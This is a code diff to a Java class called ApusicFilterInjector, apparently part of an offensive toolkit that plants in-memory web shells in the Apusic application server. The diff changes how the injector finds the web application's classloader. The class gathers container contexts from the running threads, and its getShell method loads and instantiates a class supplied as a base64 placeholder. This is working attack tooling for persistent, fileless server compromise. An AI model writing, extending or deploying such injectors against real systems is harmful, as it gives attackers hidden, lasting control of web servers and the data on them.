@@ -45,6 +45,10 @@ public class ApusicFilterInjector {
         return "{{base64Str}}";
     }
 
+    /**
+     * com.apusic.web.container.WebContainer
+     * /usr/local/ass/lib/apusic.jar
+     */
     public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
@@ -56,12 +60,17 @@ public class ApusicFilterInjector {
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            return ((ClassLoader) getFieldValue(context, "loader"));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
